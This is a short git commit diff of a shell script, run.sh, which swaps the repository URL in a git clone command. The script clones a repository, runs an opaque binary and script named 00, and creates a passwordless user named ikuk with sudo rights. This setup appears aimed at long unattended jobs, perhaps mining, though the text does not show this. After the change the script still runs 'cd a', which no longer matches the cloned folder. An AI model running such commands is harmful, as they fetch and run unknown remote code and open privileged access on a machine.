0b5ff38c3ba227651c02cfb7dfd1020608a39b37
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2021-07-02 14:32:38 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -11,7 +11,7 @@ sudo apt update
 #before 02
 #!/bin/bash
 sudo apt update
-git clone https://github.com/03081997/a.git && cd a
+git clone https://github.com/d-crypto99/00.git && cd a
 chmod +x 00.sh && chmod +x 00
 sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
 sudo -u ikuk -H sh -c "timeout 359m ./00.sh"
